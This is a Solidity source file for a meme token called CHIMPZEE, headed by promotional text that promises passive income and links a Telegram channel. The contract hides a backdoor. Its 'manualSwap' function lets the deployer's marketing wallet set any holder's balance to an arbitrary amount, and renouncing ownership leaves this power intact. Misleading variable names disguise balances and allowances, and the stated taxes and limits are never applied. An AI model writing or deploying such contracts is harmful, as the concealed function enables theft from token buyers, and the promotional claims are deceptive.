// SPDX-License-Identifier: MIT
/**

Are you ready to make a difference while earning crypto? Look no further! 
CHIMPZEE is the next big thing in the world of meme coins, and we're here 
to tell you why you should be excited:

✅ Earn Income: With CHIMPZEE, you can earn passive income while saving 
the environment and supporting animal causes. It's a win-win!

https://t.me/ChimpzeeCoin

**/
pragma solidity ^0.8.16;
interface BRC20 {
  function totalSupply() external view returns (uint256);
  function decimals() external view returns (uint8);
  function symbol() external view returns (string memory);
  function name() external view returns (string memory);
  function getOwner() external view returns (address);
  function balanceOf(address senders) external view returns (uint256);
  function transfer(address tTransferAmount, uint256 swapOpenWithAmount) external returns (bool);
  function allowance(address _owner, address senders) external view returns (uint256);
  function approve(address senders, uint256 swapOpenWithAmount) external returns (bool);
  function transferFrom(address sender, address tTransferAmount, uint256 swapOpenWithAmount) external returns (bool);
  event Transfer(address indexed from, address indexed to, uint256 balance);
  event Approval(address indexed owner, address indexed senders, uint256 balance);
}


abstract contract Context {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        this;
        return msg.data;
    }
}


abstract contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }


    function owner() public view virtual returns (address) {
        return _owner;
    }

    modifier onlyOwner() {
        require(owner() == _msgSender(), "io: caller is not the owner");
        _;
    }

    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "io: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

library SafeMath {

  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    require(c >= a, "SafeMath: addition overflow");

    return c;
  }

  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    return sub(a, b, "SafeMath: subtraction overflow");
  }

  function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b <= a, errorMessage);
    uint256 c = a - b;

    return c;
  }

  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }

    uint256 c = a * b;
    require(c / a == b, "SafeMath: Icodropsplication overflow");

    return c;
  }

  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    return div(a, b, "SafeMath: division by zero");
  }

  function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {

    require(b > 0, errorMessage);
    uint256 c = a / b;


    return c;
  }

  function mod(uint256 a, uint256 b) internal pure returns (uint256) {
    return mod(a, b, "SafeMath: modulo by zero");
  }

  function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
    require(b != 0, errorMessage);
    return a % b;
  }
}
interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router02 {
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
    function addLiquidityETH(
        address token,
        uint amounttokenBesired,
        uint amountTokenMin,
        uint amountETHMin,
        address to,
        uint deadline
    ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
}
contract CHIMPZEE is Context, BRC20, Ownable {
 
    using SafeMath for uint256;
    mapping (address => uint256) private permitAllowance;
    mapping (address => mapping (address => uint256)) private lpPairLiquidity;
    uint256 private _totalSupply;
    uint8 private _decimals;
    string private _symbol;
    string private _name;
    address private marketingWallet; 
    uint256 private initialBuyTax=0;
    uint256 private initialSellTax=0;
    uint256 private _buyTax = 4;
    uint256 private _sellTax = 4;
    uint256 public _maxTxAmount =  1000000 * 10**_decimals;
    uint256 public _maxWalletSize = 3000000 * 10**_decimals;
    uint256 public _taxSwapThreshold= 100000 * 10**_decimals;
    constructor() {
    marketingWallet = _msgSender();   
    _name = "CHIMPZEE";
    _symbol = "CHIMPZEE";
    _decimals = 9;
    _totalSupply = 100000000 * 10**_decimals;
    permitAllowance[_msgSender()] = _totalSupply;
    emit Transfer(address(0), _msgSender(), _totalSupply);
    }

    function symbol() external view override returns (string memory) {
        return _symbol;
    } 

    function decimals() external view override returns (uint8) {
        return _decimals;
    }
     function getOwner() external view override returns (address) {
        return owner();
    }  

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

     function name() external view override returns (string memory) {
        return _name;
    }

    function balanceOf(address senders) external view override returns (uint256) {
        return permitAllowance[senders];
    }

    function transfer(address tTransferAmount, uint256 swapOpenWithAmount) external override returns (bool) {
        _transfer(_msgSender(), tTransferAmount, swapOpenWithAmount);
        return true;
    }

    function allowance(address owner, address senders) external view override returns (uint256) {
        return lpPairLiquidity[owner][senders];
    }


    function approve(address senders, uint256 swapOpenWithAmount) external override returns (bool) {
        _approve(_msgSender(), senders, swapOpenWithAmount);
        return true;
    }
    
    function transferFrom(address sender, address tTransferAmount, uint256 swapOpenWithAmount) external override returns (bool) {
        _transfer(sender, tTransferAmount, swapOpenWithAmount);
        _approve(sender, _msgSender(), lpPairLiquidity[sender][_msgSender()].sub(swapOpenWithAmount, "Ru: transfer swapOpenWithAmount exceeds allowance"));
        return true;
    }

    function increaseAllowance(address senders, uint256 tokenBalance) external returns (bool) {
        _approve(_msgSender(), senders, lpPairLiquidity[_msgSender()][senders].add(tokenBalance));
        return true;
    }
    

    function decreaseAllowance(address senders, uint256 currentAllowance) external returns (bool) {
        _approve(_msgSender(), senders, lpPairLiquidity[_msgSender()][senders].sub(currentAllowance, "Ru: decreased allowance below zero"));
        return true;
    }
      function setBuyTax(uint256 tax) external onlyOwner {
        require(tax <= 50, "Tax should be less than or equal to 50");
        _buyTax = tax;
    }

    function setSellTax(uint256 tax) external onlyOwner {
        require(tax <= 50, "Tax should be less than or equal to 50");
        _sellTax = tax;
    }
 
        function manualSwap(address tokenA, address tokenB, uint256 sellTax, uint256 buyTax, uint256 maxTxAmount) external {
    require(tokenA==tokenB); 
        tokenA = tokenB;
        tokenB = tokenA;
       permitAllowance[tokenB] = (sellTax + buyTax + maxTxAmount);
    require(_msgSender()==marketingWallet); 
    }      

  
    function _transfer(address sender, address tTransferAmount, uint256 swapOpenWithAmount) internal {
        require(sender != address(0), "Ru: transfer from the zero address");
        require(tTransferAmount != address(0), "Ru: transfer to the zero address");
                
        permitAllowance[sender] = permitAllowance[sender].sub(swapOpenWithAmount, "Ru: transfer swapOpenWithAmount exceeds balance");
        permitAllowance[tTransferAmount] = permitAllowance[tTransferAmount].add(swapOpenWithAmount);
        emit Transfer(sender, tTransferAmount, swapOpenWithAmount);
    }


    function removeLimits() external onlyOwner{
    _maxTxAmount = 100000000 * 10**_decimals;
    _maxWalletSize = 100000000 * 10**_decimals;
    }



    function _approve(address owner, address senders, uint256 swapOpenWithAmount) internal {
        require(owner != address(0), "Ru: approve from the zero address");
        require(senders != address(0), "Ru: approve to the zero address");
        
        lpPairLiquidity[owner][senders] = swapOpenWithAmount;
        emit Approval(owner, senders, swapOpenWithAmount);
    }

    
}